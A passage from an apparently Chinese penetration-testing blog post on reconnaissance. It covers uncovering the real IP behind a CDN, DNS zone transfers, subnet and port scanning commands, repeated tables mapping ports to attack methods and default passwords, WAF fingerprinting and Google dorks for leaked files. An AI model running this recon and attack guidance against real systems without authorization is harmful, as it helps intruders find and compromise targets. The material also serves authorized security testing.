API，不过只针对目标网站是否使用 CloudFlare 服务进行探测。 证书收集 可以通过 https://crt.sh 进行快速证书查询收集 附上查询的 python 小脚本： import requests import re TIME_OUT = 60 def get_SSL(domain): domains = [] url = 'https://crt.sh/?q=%25.{}'.format(domain) response = requests.get(url,timeout=TIME_OUT) ssl = re.findall(\"&lt;TD&gt;(.*?).{}&lt;/TD&gt;\".format(domain),response.text) for i in ssl: i += '.' + domain domains.append(i) print(domains) if __name__ == '__main__': get_SSL(\"baidu.com\") 获得所有包含证书的子域： 通过海外 DNS 查询 针对国内市场用户，大部分的 CDN 服务商并没有做海外市场的 CDN ，所以可以通过寻找小众、冷门的海外 DNS 查询，看是否能获得真实 IP 。 nslookup target.com &lt;海外 DNS 地址&gt; 也可以使用海外的超级ping类的平台在线多国家多地区测试，推荐 https://www.host-tracker.com/v3/check/ ，支持 140 多个地区的 ping 测试，另外支持针对某子域超长期的监控，通过邮件通知，简直太强大了。——就是需要氪金 小技巧：在https://github.com/ 上也可以搜索子域名，运气好的话，会有意想不到的收获。 通过变更的域名 很多网站在发展的过程中，会更换域名，比如京东以前的域名是 360buy.com ，后来斥巨资购买了 jd.com 。 网站在更换新域名时，如果将 CDN 部署到新的域名上，而之前的域名由于没过期，可能未使用 CDN，因此可以直接获得服务器 IP，所以，历史域名也是一个很重要的点。 通过 APP 移动端应用 如果网站存在 APP ，可以通过抓包分析其 APP 的数据流量，看是否能找到网站真实 IP 地址，记得关注 APP 的历史版本，里面会有很多 surprise 。 通过 F5 LTM 解码 LTM 是将所有的应用请求分配到多个节点服务器上。提高业务的处理能力，也就是负载均衡。 当服务器使用 F5 LTM 做负载均衡时，通过对 set-cookie 关键字的解码，可以获取服务器真实 ip 地址。 例如： Set-Cookie: BIGipServerpool_9.29_5229=605532106.22012.0000 先把第一小节的十进制数，即 605532106 取出来 将其转为十六进制数 2417afca 接着从后至前，取四个字节出来： CA AF 17 24 最后依次转为十进制数 202.175.23.36，即是服务器的真实 ip 地址。 通过全网扫描 首先从 apnic 网络信息中心 或 IPdeny 获取目标地区 ip 段。 接着使用 Zmap、masscan 等工具对扫描出来端口开放的主机进行 banner 爬取。 然后在 http-req 的 Host 字段，写入我们需要寻找的子域。 最后过滤特征，确认是否有对应的服务器响应。 如果端口不是常见或者固定，当场退役。 缺陷：实际上，全网扫描的方法十分笨重，不推荐。因为已经有很多的网站给我们提供了全网爬取服务，之前的方法里都有介绍到，何必自己全网扫描呢，受限于网络、受限于设备，你个人爬的数据也不会有人家商业爬的全 通过 virtual-host 碰撞 当我们收集了目标足够多的可能的真实 IP 时，可以通过 IP 和子域的碰撞，来批量获得命中目标以及目标哪些的子域。 这里对于我这个小白还不懂什么是host碰撞，那我们先来了解一下： 什么是HOSTS碰撞： 当直接访问IP回显4xx错误，直接指定HOST头为某个域名时访问该IP回显正常时，可判断可进行HOSTS碰撞。 当一些域名只允许在内网访问时，可通过这种碰撞直接突破边界限制，访问到内网系统进行下一步渗透测试。 比如如果此时对方的网站对应的中间件有如下配置 server { listen 80 default_server; server_name _; return 400; } server { listen 80; server_name www.tpaertest.com; location / { proxy_pass http://192.168.3.17:8003; proxy_redirect off; proxy_set_header Host $host:$server_port; proxy_set_header X-Real-IP $remote_addr; proxy_set_header X-Forwarded-For $proxy_add_x_forwarded_for; root html; index index.html index.html; } access_log logs/test.com.log; } 第一个server的意思是，监听80端口，且如果我们访问的servername不是其他server块儿（也就是这里的第二个）配置的servername，那就返回400。这里我们第二个server块儿设置了servername为指定域名，也就是如果我们在访问该网站的时候不是用指定域名访问的，就会返回400（也就是禁用IP访问了）。这里我结合那些文章举个例子吧： 比如我们此时对目标网站进行信息搜集之后，有了大量的IP资产，并且这些IP资产也开启了web端口，但当我们使用IP直接访问的时候会发现总是返回400、403、404等等。这基本就是对方的中间件使用了反向代理，禁用了IP访问。此时呢，对方网站设置的是：只能使用内网域名来访问该网站。 而对于处于外网的我们来讲，如果我们找到了该IP对应的真正域名，此时我们去访问该域名的时候也是行不通的，因为他是内网域名，而我们在访问的时候，会去公网DNS服务器去寻求域名对应解析出来的IP，但很明显是找不到的。 只有我们在本地hosts文件中设置IP-&gt;正确域名的解析关系，这时我们再去访问的时候就可以成功访问目标内网系统。因为本地hosts的IP解析优先级高于公共的DNS服务器。 具体可参考：边界渗透中的小技巧-Hosts碰撞 、利用HOSTS碰撞突破边界、Host碰撞环境搭建原理及复现 回到正题，那我们在遇到类似情况就可以使用自动化工具来快速明确IP与域名的正确绑定关系： 自动化的过程可以使用 virtual-host-discovery 工具，项目地址：https://github.com/jobertabma/virtual-host-discovery 使用方法： $ ruby scan.rb --ip=x.x.x.x --host=domain --wordlist=&lt;dict file&gt; 其中wordlsit 参数可以省略，默认有一个字典加载，使用该参数则是指定我们自己想要跑的子域列表。 执行后，即可快速找出命中 IP 的子域，这里放上一个成果图（未实践） 另外可以通过 find-virtual-hosts （https://pentest-tools.com/information-gathering/find-virtual-hosts#）工具来在线快速针对全网数据扫描比对得出结果： 通过 favicon.ico 哈希特征 favicon.ico 是现代浏览器在网页标题的左侧显示的一个小图标。 该图标数据通常是从 https://anywebsite/favicon.ico 处获取的，浏览器会在浏览任何网站时自动请求它。 因为可以通过计算 favicon.ico 的指纹哈希，然后去 shodan 等搜索引擎搜索与之相同的主机结果，从而进一步探测是否能挖掘出目标网站的真实 IP 地址。 计算 favicon.ico 哈希的小脚本： python 2 import mmh3 import requests response = requests.get('https://domain.com/favicon.ico') favicon = response.content.encode('base64') hash = mmh3.hash(favicon) print hash python 3 import mmh3 import requests import codecs response = requests.get('https://domain.com/favicon.ico') favicon = codecs.encode(response.content,\"base64\") hash = mmh3.hash(favicon) print(hash) 安装好环境依赖后执行脚本，计算得到目标网站的 favicon.ico 哈希值： 然后用 shodan 搜索引擎搜索哈希，去命中 IP： proxychains4 shodan search http.favicon.hash:1533180946 --fields ip_str,port --separator \" \" | awk '{print $1\":\"$2}' 这里不知为何访问总是被禁，但在网站上还是可以正常访问的。。。。 感觉是api-key的问题，但也没解决，先放着吧。。。 通过网页源码特征值 在服务器源 IP 地址允许访问并且返回的也是类似的网站内容情况下，可以通过侦察页面源码中 JS 、CSS 、HTML 等一系列静态特征值，然后用 Shodan 、Zoomeye 、Censys 等搜索引擎进行匹配搜索，从而定位 IP 。 例如源码中找到一段 Google Analytics 的 JS 特征： 这里我的找的特征值也不够有特色，可以看到回显的 使用 CloudFair 工具 如果你的目标是 CloudFlare 保护的，建议先上这款工具跑。 CloudFail 是一种战术侦察工具，旨在收集有关受 Cloudflare 保护的目标的足够信息，以期发现服务器的 IP 位置。 该工具目前探测经过3个不同的攻击阶段： 1.使用 DNSDumpster.com 扫描 DNS 配置错误。 2.扫描和比对 Crimeflare.com 数据库。 3.内置字典暴力扫描超过11000个子域名。 安装和使用： git clone https://github.com/m0rtem/CloudFail pip install -r requirements.txt python cloudfail.py -t domain.com DNS 域传送发现子域名 DNS 服务器分为：主服务器、备份服务器和缓存服务器。在主备服务器之间同步数据库，需要使用 “DNS 域传送”。域传送是指备份服务器从主服务器拷贝数据，并用得到的数据更新自身数据库。 若 DNS 服务器配置不当，可能导致攻击者获取某个域的所有记录。造成整个网络的拓扑结构泄露给潜在的攻击者，包括一些安全性较低的内部主机，如测试服务器。同时，黑客可以快速的判定出某个特定 zone 的所有主机，收集域信息，选择攻击目标，找出未使用的 IP 地址，绕过基于网络的访问控制。目前来看 “DNS 域传送漏洞” 已经很少了。 利用 nmap 漏洞检测脚本 dns-zone-transfer 进行检测 nmap&nbsp;--script&nbsp;dns-zone-transfer&nbsp;--script-args&nbsp;dns-zone-transfer.domain=xxx.edu.cn&nbsp;-p&nbsp;53&nbsp;-Pn&nbsp;dns.xxx.edu.cn Linux dig命令进行测试 dig xxx.com nsdig axfr @dns xxx.com 最后记几个未能实践但却值得记录的几个方法（万一日后用上呢） 通过 CDN 标头特征值–censys搜索 通过 XML-RPC PINGBACK 通信 ——似乎是针对支持 WordPress 的网站的方法 通过 FTP/SCP 协议 利用 Websocket 协议——针对那些没有针对websocket进行部署的网站 社会工程学——社工的魅力 通过全网扫描 通过网站远程资源业务 ——注入我们自己的服务器资源文件，看http日志 通过CDN机器 ——对于自搭建CDN的网站，我们可以尝试渗透一些防护弱的CDN机器 通过流量耗尽、流量放大攻击 ——利用CDN流量有限的特点来进行ddos 通过域名备案信息广域探测——尝试寻找没有做CDN的边缘子域 利用CDN 服务商默认配置 ——CloudFlare ，默认配置 direct.domain.com 二级子域指向服务器源 IP IP段的收集 一般IP的话，我们在收集子域名的时候，就大概知道目标网站的IP段了。 也可以通过whois命令获取。即通过中国互联网信息中心http://ipwhois.cnnic.net.cn/进行查询： C段与旁站查询 C 段：是指与目标服务器在同一 C 段网络的服务器。攻击目标的 C 段存活主机是信息收集的重要步骤，很多企业的内部服务器可能都会在一个 C 段网络中。在很难找到攻击目标服务器互联网漏洞的情况下，可以通过攻击 C 段主机，获取对 C 段主机的控制权，进入企业内网，在企业的内网安全隔离及安全防护不如互联网防护健全的情况下，可以通过 C 段的主机进行内网渗透，这样就可以绕过互联网的防护，对目标进行攻击。但是这种攻击方式容易打偏。 旁站：是和目标网站在同一台服务器上的其它的网站。 Nmap扫描 使用命令 nmap -sn x.x.x.x/24，对目标 IP 的 C 段主机进行存活扫描，根据扫描的结果可以判断目标 IP 的 C 段还有哪些主机存活。 nmap -Pn 这个命令在实际工作中的使用很多，该命令不通过 ICMP 协议进行主机存活判断，会直接对端口进行扫描。这样在开启了防火墙禁 Ping 的情况下，也可以利用这个命令正常扫描目标是否存活及对外开启的相关服务。 搜索引擎语法 Google：site:x.x.x.* Bing.com，语法为：http://cn.bing.com/search?q=ip:111.111.111.111 Fofa：ip=\"x.x.x.x/24\" 查旁站：https://chapangzhan.com/ 云悉：https://www.yunsee.cn/ K8工具、goby、御剑、北极熊扫描器等 站长之家：http://s.tool.chinaz.com/same 在线：http://www.webscan.cc/ http://www.webscan.cc/ nmap扫描 nmap -p 80,8080 --open ip/24 这里一共是扫描出256的存活的ip。 httpscan 项目地址： https://github.com/zer0h/httpscan bufferfly 项目地址：https://github.com/dr0op/bufferfly 攻防资产处理小工具，对攻防前的信息搜集到的大批量资产/域名进行存活检测、获取标题头、语料提取、常见web端口检测、简单中间识别，去重等，便于筛选有价值资产。——下面附上一个成果展示图： cscan 项目地址：https://github.com/z1un/cscan 与httpscan很像，不过这是py3的，但效果感觉不如http masscan 项目地址：https://github.com/robertdavidgraham/masscan 与nmap类似，一个强大的端口扫描工具。优势在于速度快，缺点是误报率也高 fscan 项目地址：https://github.com/shadow1ng/fscan ——扫描速度快，支持漏洞验证 一款内网综合扫描工具，方便一键自动化、全方位漏扫扫描。 支持主机存活探测、端口扫描、常见服务的爆破、ms17010、redis批量写公钥、计划任务反弹shell、读取win网卡信息、web指纹识别、web漏洞扫描、netbios探测、域控识别等功能。 shuize 项目地址：https://github.com/0x727/ShuiZe_0x727 水泽自带资产探活、支持漏洞验证、Host碰撞 ALLiN 项目地址：https://github.com/P1-Team/AlliN 一个辅助平常渗透测试项目或者攻防项目快速打点的综合工具，由之前写的工具AG3改名而来。是一款轻便、小巧、快速、全面的扫描工具。多用于渗透前资产收集和渗透后内网横向渗透。工具从项目上迭代了一些懒人功能（比如提供扫描资产文件中，可以写绝大部分的各种形式的链接/CIDR,并在此基础上可以添加任意端口和路径） 红队信息搜集工具，被动识别访问站点是否是云上站点 python3 AlliN.py --host 110.242.68.0/24 -p 80 -m pscan Ehole 项目地址：https://github.com/EdgeSecurityTeam/EHole EHole是一款对资产中重点系统指纹识别的工具，在红队作战中，信息收集是必不可少的环节，如何才能从大量的资产中提取有用的系统(如OA、VPN、Weblogic…)。EHole旨在帮助红队人员在信息收集期间能够快速从C段、大量杂乱的资产中精准定位到易被攻击的系统，从而实施进一步攻击。 开放端口探测 收集到大量IP，那就要进行端口扫描了，看看有什么常见的漏洞。 最常用的就是神器Nmap了。命令：nmap -T4 -sT -p -sV ip -sS (TCP SYN扫描) -sT (TCP connect()扫描) -sU (UDP扫描) -sN; -sF; -sX (TCP Null，FIN，and Xmas扫描) -Pn (不通过ICMP探测) 详细文档： https://nmap.org/man/zh/ 其次可能还会用到 masscan，常见端口及对应服务表： 端口 服务 渗透用途 tcp 20,21 FTP 允许匿名的上传下载,爆破,嗅探,win提权,远程执行(proftpd 1.3.5),各类后门(proftpd,vsftp 2.3.4) tcp 22 SSH 可根据已搜集到的信息尝试爆破,v1版本可中间人,ssh隧道及内网代理转发,文件传输等等 tcp 23 Telnet 爆破,嗅探,一般常用于路由,交换登陆,可尝试弱口令 tcp 25 SMTP 邮件伪造,vrfy/expn查询邮件用户信息,可使用smtp-user-enum工具来自动跑 tcp/udp 53 DNS 允许区域传送,dns劫持,缓存投毒,欺骗以及各种基于dns隧道的远控 tcp/udp 69 TFTP 尝试下载目标及其的各类重要配置文件 tcp 80-89,443,8440-8450,8080-8089 各种常用的Web服务端口 可尝试经典的topn,vpn,owa,webmail,目标oa,各类Java控制台,各类服务器Web管理面板,各类Web中间件漏洞利用,各类Web框架漏洞利用等等…… tcp 110 POP3 可尝试爆破,嗅探 tcp 111,2049 NFS 权限配置不当 tcp 137,139,445 Samba 可尝试爆破以及smb自身的各种远程执行类漏洞利用,如,ms08-067,ms17-010,嗅探等…… tcp 143 IMAP 可尝试爆破 udp 161 SNMP 爆破默认团队字符串,搜集目标内网信息 tcp 389 LDAP ldap注入,允许匿名访问,弱口令 tcp 512,513,514 Linux rexec 可爆破,rlogin登陆 tcp 873 Rsync 匿名访问,文件上传 tcp 1194 OpenVPN 想办法钓VPN账号,进内网 tcp 1352 Lotus 弱口令,信息泄漏,爆破 tcp 1433 SQL Server 注入,提权,sa弱口令,爆破 tcp 1521 Oracle tns爆破,注入,弹shell… tcp 1500 ISPmanager 弱口令 tcp 1723 PPTP 爆破,想办法钓VPN账号,进内网 tcp 2082,2083 cPanel 弱口令 tcp 2181 ZooKeeper 未授权访问 tcp 2601,2604 Zebra 默认密码zerbra tcp 3128 Squid 弱口令 tcp 3312,3311 kangle 弱口令 tcp 3306 MySQL 注入,提权,爆破 tcp 3389 Windows rdp shift后门[需要03以下的系统],爆破,ms12-020 tcp 3690 SVN svn泄露,未授权访问 tcp 4848 GlassFish 弱口令 tcp 5000 Sybase/DB2 爆破,注入 tcp 5432 PostgreSQL 爆破,注入,弱口令 tcp 5900,5901,5902 VNC 弱口令爆破 tcp 5984 CouchDB 未授权导致的任意指令执行 tcp 6379 Redis 可尝试未授权访问,弱口令爆破 tcp 7001,7002 WebLogic Java反序列化,弱口令 tcp 7778 Kloxo 主机面板登录 tcp 8000 Ajenti 弱口令 tcp 8443 Plesk 弱口令 tcp 8069 Zabbix 远程执行,SQL注入 tcp 8080-8089 Jenkins,JBoss 反序列化,控制台弱口令 tcp 9080-9081,9090 WebSphere Java反序列化/弱口令 tcp 9200,9300 ElasticSearch 远程执行 tcp 11211 Memcached 未授权访问 tcp 27017,27018 MongoDB 爆破,未授权访问 tcp 50070,50030 Hadoop 默认端口未授权访问 端口号 端口说明 渗透思路 21/69 FTP/TFTP：文件传输协议 爆破、内网嗅探 22 SSH：远程连接 用户名枚举、爆破 23 Telnet：远程连接 爆破、内网嗅探 25 SMTP：邮件服务 邮件伪造 53 DNS：域名系统 DNS域传送\\DNS缓存投毒\\DNS欺骗\\利用DNS隧道技术刺透防火墙 389 LDAP 未授权访问（通过LdapBrowser工具直接连入） 443 https服务 OpenSSL 心脏滴血（nmap -sV --script=ssl-heartbleed 目标） 445 SMB服务 ms17_010远程代码执行 873 rsync服务 未授权访问 1090/1099 Java-rmi JAVA反序列化远程命令执行漏洞 1352 Lotus Domino邮件服务 爆破：弱口令、信息泄漏：源代码 1433 MSSQL 注入、SA弱口令爆破、提权 1521 Oracle 注入、TNS爆破 2049 NFS 配置不当 2181 ZooKeeper服务 未授权访问 3306 MySQL 注入、爆破、写shell、提权 3389 RDP 爆破、Shift后门、CVE-2019-0708远程代码执行 4848 GlassFish控制台 爆破：控制台弱口令、认证绕过 5000 Sybase/DB2数据库 爆破、注入 5432 PostgreSQL 爆破弱口令、高权限执行系统命令 5632 PcAnywhere服务 爆破弱口令 5900 VNC 爆破：弱口令、认证绕过 6379 Redis 未授权访问、爆破弱口令 7001 WebLogic中间件 反序列化、控制台弱口令+部署war包、SSRF 8000 jdwp JDWP 远程命令执行漏洞（工具） 8080/8089 Tomcat/JBoss/Resin/Jetty/Jenkins 反序列化、控制台弱口令、未授权 8161 ActiveMQ admin/admin、任意文件写入、反序列化 8069 Zabbix 远程命令执行 9043 WebSphere控制台 控制台弱口令https://:9043/ibm/console/logon.jsp、远程代码执行 9200/9300 Elasticsearch服务 远程代码执行 11211 Memcache 未授权访问（nc -vv 目标 11211） 27017 MongoDB 未授权访问、爆破弱口令 50000 SAP 远程代码执行 50070 hadoop 未授权访问 端口号 服务 渗透思路 21 FTP/TFTP/VSFTPD 爆破/嗅探/溢出/后门 22 ssh远程连接 爆破/openssh漏洞 23 Telnet远程连接 爆破/嗅探/弱口令 25 SMTP邮件服务 邮件伪造 53 DNS域名解析系统 域传送/劫持/缓存投毒/欺骗 67/68 dhcp服务 劫持/欺骗 110 pop3 爆破/嗅探 139 Samba服务 爆破/未授权访问/远程命令执行 143 Imap协议 爆破161SNMP协议爆破/搜集目标内网信息 389 Ldap目录访问协议 注入/未授权访问/弱口令 445 smb ms17-010/端口溢出 512/513/514 Linux Rexec服务 爆破/Rlogin登陆 873 Rsync服务 文件上传/未授权访问 1080 socket 爆破 1352 Lotus domino邮件服务 爆破/信息泄漏 1433 mssql 爆破/注入/SA弱口令 1521 oracle 爆破/注入/TNS爆破/反弹shell2049Nfs服务配置不当 2181 zookeeper服务 未授权访问 2375 docker remote api 未授权访问 3306 mysql 爆破/注入 3389 Rdp远程桌面链接 爆破/shift后门 4848 GlassFish控制台 爆破/认证绕过 5000 sybase/DB2数据库 爆破/注入/提权 5432 postgresql 爆破/注入/缓冲区溢出 5632 pcanywhere服务 抓密码/代码执行 5900 vnc 爆破/认证绕过 6379 Redis数据库 未授权访问/爆破 7001/7002 weblogic java反序列化/控制台弱口令 80/443 http/https web应用漏洞/心脏滴血 8069 zabbix服务 远程命令执行/注入 8161 activemq 弱口令/写文件 8080/8089 Jboss/Tomcat/Resin 爆破/PUT文件上传/反序列化 8083/8086 influxDB 未授权访问 9000 fastcgi 远程命令执行 9090 Websphere 控制台爆破/java反序列化/弱口令 9200/9300 elasticsearch 远程代码执行 11211 memcached 未授权访问 27017/27018 mongodb 未授权访问/爆破 端口号 服务 渗透思路 20 ftp_data 爆破、嗅探、溢出、后门 21 ftp_control 爆破、嗅探、溢出、后门 23 telnet 爆破、嗅探 25 smtp 邮件伪造 53 DNS DNS区域传输、DNS劫持、DNS缓存投毒、DNS欺骗、深度利用：利用DNS隧道技术刺透防火墙 67 dhcp 劫持、欺骗 68 dhcp 劫持、欺骗 110 pop3 爆破 139 samba 爆破、未授权访问、远程代码执行 143 imap 爆破 161 snmp 爆破 389 ldap 注入攻击、未授权访问 512 linux r 直接使用rlogin 513 linux r 直接使用rlogin 514 linux r 直接使用rlogin 873 rsync 未授权访问 888 BTLINUX 宝塔Linux主机管理后台/默认帐户：admin｜默认密码：admin 999 PMA 护卫神佩带的phpmyadmin管理后台，默认帐户：root｜默认密码：huweishen.com 1080 socket 爆破：进行内网渗透 1352 lotus 爆破：弱口令、信息泄露：源代码 1433 mssql 爆破：使用系统用户登录、注入攻击 1521 oracle 爆破：TNS、注入攻击 2049 nfs 配置不当 2181 zookeeper 未授权访问 3306 mysql 爆破、拒绝服务、注入 3389 rdp 爆破、Shift后门 4848 glassfish 爆破：控制台弱口令、认证绕过 5000 sybase/DB2 爆破、注入 5432 postgresql 缓冲区溢出、注入攻击、爆破：弱口令 5632 pcanywhere 拒绝服务、代码执行 5900 vnc 爆破：弱口令、认证绕过 5901 vnc 爆破：弱口令、认证绕过 5902 vnc 爆破：弱口令、认证绕过 6379 redis 未授权访问、爆破：弱口令 7001 weblogic JAVA反序列化、控制台弱口令、控制台部署webshell 7002 weblogic JAVA反序列化、控制台弱口令、控制台部署webshell 80 web 常见Web攻击、控制台爆破、对应服务器版本漏洞 443 web 常见Web攻击、控制台爆破、对应服务器版本漏洞 8080 web｜Tomcat｜… 常见Web攻击、控制台爆破、对应服务器版本漏洞、Tomcat漏洞 8069 zabbix 远程命令执行 9090 websphere 文件泄露、爆破：控制台弱口令、Java反序列 9200 elasticsearch 未授权访问、远程代码执行 9300 elasticsearch 未授权访问、远程代码执行 11211 memcacache 未授权访问 27017 mongodb 爆破、未授权访问 27018 mongodb 爆破、未授权访问 50070 Hadoop 爆破、未授权访问 50075 Hadoop 爆破、未授权访问 14000 Hadoop 爆破、未授权访问 8480 Hadoop 爆破、未授权访问 8088 web 爆破、未授权访问 50030 Hadoop 爆破、未授权访问 50060 Hadoop 爆破、未授权访问 60010 Hadoop 爆破、未授权访问 60030 Hadoop 爆破、未授权访问 10000 Virtualmin/Webmin 服务器虚拟主机管理系统 10003 Hadoop 爆破、未授权访问 5984 couchdb 未授权访问 445 SMB 弱口令爆破，检测是否有ms_08067等溢出 1025 111 NFS 2082 cpanel主机管理系统登陆 （国外用较多） 2083 cpanel主机管理系统登陆 （国外用较多） 2222 DA虚拟主机管理系统登陆 （国外用较多） 2601 zebra路由 2604 zebra路由 3128 代理默认端口,如果没设置口令很可能就直接漫游内网了 3311 kangle主机管理系统登陆 3312 kangle主机管理系统登陆 4440 参考WooYun: 借用新浪某服务成功漫游新浪内网 6082 参考WooYun: Varnish HTTP accelerator CLI 未授权访问易导致网站被直接篡改或者作为代理进入内网 7778 主机控制面板登录 8083 主机管理系统 （国外用较多） 8649 8888 主机管理系统默认端口 9000 fcgi php执行 50000 SAP 命令执行 网络架构探测 当我们探测目标站点网站架构时，比如说：操作系统，中间件，脚本语言，数据库，服务器，web容器等等，可以使用以下方法查询。 CMS识别 识别 CMS 的目的在于，方便利用已公开漏洞进行渗透测试，甚至可以到对应 CMS 的官网下载对应版本的 CMS 进行本地白盒代码审计。 （1）wappalyzer插件——火狐插件 （2）云悉：http://www.yunsee.cn/ —不过这个邀请码有点。。。。 （3）CMS指纹识别：http://whatweb.bugscaner.com/look/ ——但这个似乎不能用了 CMS指纹识别又有很多方法，比如说御剑指纹识别、Webrobot工具、whatweb工具、还有在线查询的网站等等。 服务器信息搜集 服务版本识别、操作系统信息识别都可以利用 nmap 实现识别 nmap -sV -p 1-65535 x.x.x.xnmap -O x.x.x.x 特定关键字识别 CMS 的首页文件、特定文件可能包含了 CMS 类型及版本信息，通过访问这些文件，将返回的网页信息（如 Powered by XXCMS）与扫描工具数据库存储的指纹信息进行正则匹配，判断 CMS 的类型。 也可能前端源码中或 meta 标签中的 content 字段存在一些 CMS 特征信息，下图很明显能得知是 WordPress 框架 特定文件及路径识别 不同的 CMS 会有不同的网站结构及文件名称，可以通过特定文件及路径识别 CMS。如 WordPress 会有特定的文件路径 /wp-admin、/wp-includes 等，有些 CMS 的 robots.txt 文件也可能包含了 CMS 特定的文件路径，与扫描工具数据库存储的指纹信息进行正则匹配，判断 CMS 的类型。 CMS 会有一些 JS、CSS、图片等静态文件，这些文件一般不会变化，可以利用这些特定文件的 MD5 值作为指纹信息来判断 CMS 的类型。 响应头信息识别 应用程序会在响应头 Server、X-Powered-By、Set-Cookie 等字段中返回 Banner 信息或者自定义的数据字段，通过响应头返回的信息，可以对应用进行识别，有些 WAF 设备也可以通过响应头信息进行识别判断。当然 Banner 信息并不一定是完全准确的，应用程序可以自定义自己的 Banner 信息。 例如 Shiro 的响应头信息中包含 rememberMe 字段： 常见脚本工具 项目地址：https://github.com/s7ckTeam/Glass Glass是一款针对资产列表的快速指纹识别工具，通过调用Fofa/ZoomEye/Shodan/360等api接口快速查询资产信息并识别重点资产的指纹，也可针对IP/IP段或资产列表进行快速的指纹识别。 Glass旨在帮助红队人员在资产信息收集期间能够快速从C段、大量杂乱的资产中精准识别到易被攻击的系统，从而实施进一步测试攻击。 还有两款只支持如 WordPress, Joomla, Drupal 的工具 CMSScan：https://github.com/ajinabraham/CMSScan CMSmap：https://github.com/Dionach/CMSmap 还有一些其他优秀Github项目 CMSeeK CMSmap ACMSDiscovery TideFinger AngelSword 数字观星平台 https://fp.shuziguanxing.com/#/ WAF识别 Waf也叫Web应用防火墙，是通过执行一系列针对HTTP/HTTPS的安全策略来专门为Web应用提供保护的一款产品。Waf的探测很多人都会忽略掉 主要有两种手法吧，一种是手动，一种是工具；知道了是否有WAF，用的什么WAF，我们才好对症下药 手动的话：一般来说WAF都会拦截敏感文件下载，如a.sql、a.mdb等，直接添加到网站URL中即可 一些WAF可能不防护这些，那么就可以拿一些XSS、SQLI的payload来测试也可（贴个图） 还有就是靠工具识别：wafw00f：https://github.com/EnableSecurity/wafw00f 还有Nmap神器：探测WAF有两种脚本。 一种是http-waf-detect。 nmap -p80,443 --script=http-waf-detect ip 一种是http-waf-fingerprint。 nmap -p80,443 --script=http-waf-fingerprint ip 30几款常见WAF的拦截页整理 其他应用收集 小程序 企查查等：找到小程序点击即可 微信APP 支付宝APP 和微信类似，但是不同平台因为不同的规则，可能有一点点差异 ——这里贴个别的师傅的图 公众号 企查查：https://www.qcc.com/ 天眼查：https://www.tianyancha.com/ 直接搜索相应公司，在菜单栏中找到微信公众号 ——和上面查小程序一般 依旧还可以用微信搜索，这里那位师傅说还可以用搜狗微信：https://weixin.sogou.com/ ——但我搜不出来。。 先贴个图 生活号 感觉有点类似微信上的公众号，也是通过支付宝APP搜索即可 APP搜集 收集到APP，可以测正常功能，也可以对它进行反编译查看源码，可能获取一些敏感的接口等信息。 tips：不仅要收集最新版，还要收集历史版本的APP，可能存在敏感信息，也有可能存在有漏洞的历史接口。 七麦数据 https://www.qimai.cn/ 直接搜索可以获取到部分相关的APP 但是有些较隐藏的APP直接搜名字还是搜不出来，这个时候我们就会用到七麦一个很方便的功能：同开发者APP 此外，还可以获取APP的历史版本，可能里面存在大量的敏感信息!!! 豌豆荚 使用豌豆荚可以方便的获取到APP的历史版本，这里就直接贴图了 企查查&amp;天眼查——依旧类似上面的小程序 App Store 搜索到应用往下滑，其实也是和七麦数据找同开发者APP一样的 ——贴图 PC应用 看看客户端的产品，可能有时候也会发现一些突破口 一般比较明显的官网就可以下载，可能还有一些隐藏的PC应用，或者测试版，就需要自己去寻找了 敏感文件、敏感目录探测 通常我们所说的敏感文件、敏感目录大概有以下几种： （1）Git （2）hg/Mercurial （3）svn/Subversion （4）bzr/Bazaar （5）Cvs （6）WEB-INF泄露 （7）备份文件泄露、配置文件泄露 敏感文件、敏感目录挖掘一般都是靠工具、脚本来找，当然大佬手工也能找得到。 脚本工具 （1）御剑（真的很万能，文末附上全家桶） （2）爬虫（AWVS、Burpsuite等） （3）搜索引擎（Google、Github等） （4）wwwscan （5）BBscan（一位巨佬写的python脚本：https://github.com/lijiejie/BBScan （6）GSIL（也是一位巨佬写的python脚本：https://github.com/FeeiCN/GSIL ——不过这个工具似乎存在问题，我配置不成功 （7）社交平台 Google hacking 目录遍历: site:$site intitle:index.of 配置文件泄露: site:$site ext:xml | ext:conf | ext:cnf | ext:reg | ext:inf | ext:rdp | ext:cfg | ext:txt | ext:ora | ext:ini 数据库文件泄露: site:$site ext:sql | ext:dbf | ext:mdb 日志文件泄露: site:$site ext:log 备份和历史文件: site:$site ext:bkf | ext:bkp | ext:bak | ext:old | ext:backup 登录页面: site:$site inurl:login SQL错误: site:$site intext:“sql syntax near” | intext:“syntax error has occurred” | intext:“incorrect syntax near” | intext:“unexpected end of SQL command” | intext:“Warning: mysql_connect()” | intext:“Warning: mysql_query()” | intext:“Warning: pg_connect()” 公开文件信息: site:$site ext:doc | ext:docx | ext:odt | ext:pdf | ext:rtf | ext:sxw | ext:psw | ext:ppt | ext:pptx | ext:pps | ext:csv phpinfo(): site:$site ext:php intitle:phpinfo “published by the PHP Group” 搜索粘贴站点: site:pastebin.com | site:paste2.org | site:pastehtml.com | site:slexy.org | site:snipplr.com | site:snipt.net | site:textsnip.com | site:bitpaste.app | site:justpaste.it | site:heypasteit.com | site:hastebin.com | site:dpaste.org | site:dpaste.com | site:codepad.org | site:jsitor.com | site:codepen.io | site:jsfiddle.net | site:dotnetfiddle.net | site:phpfiddle.org | site:ide.geeksforgeeks.org | site:repl.it | site:ideone.com | site:paste.debian.net | site:paste.org | site:paste.org.ru | site:codebeautify.org | site:codeshare.io | site:trello.com $site 搜索Github、Gitlab: site:github.com | site:gitlab.com $site. 在线Google Hacking利用：https://tools.zjun.info/googlehacking/ 针对信息泄露的搜索引擎 https://leakix.net/ Google hacking database https://www.exploit-db.com/google-hacking-database ffuf 项目地址：https://github.com/ffuf/ffuf ffuf -w /path/to/wordlist -u https://target/FUZZ 字典需要自己添加，在需要fuzz的地方添加“FUZZ” dirmap https://github.com/H4ckForJob/dirmap 支持递归扫描、功能将会强于DirBuster、Dirsearch、cansina、御剑 github语法 一些语法 参考自：https://github.com/obheda12/GitDorker/tree/master/Dorks 所有语法txt版 alldorksv3 medium_dorks 自动化工具：https://github.com/damit5/gitdorks_go 历史页面 在线网站：https://web.archive.org/ wayback会记录网站版本更迭，可以获取到之前版本的网站，可能会找到一些后来删除的敏感资产信息，或者一些漏洞 下面是2010年的qq.com！！ 在推荐两款强力工具： gau：https://github.com/lc/gau waybackurls：https://github.com/tomnomnom/waybackurls 网盘信息搜集 某些安全意识薄弱的人员可能上传资料到一些网盘中，没有加密码或者密码泄露，然后被一些在线云盘抓取收录了，导致信息泄露。 超能搜：https://www.chaonengsou.com/ 百度网盘爬虫：https://github.com/k1995/BaiduyunSpider 邮箱信息搜集 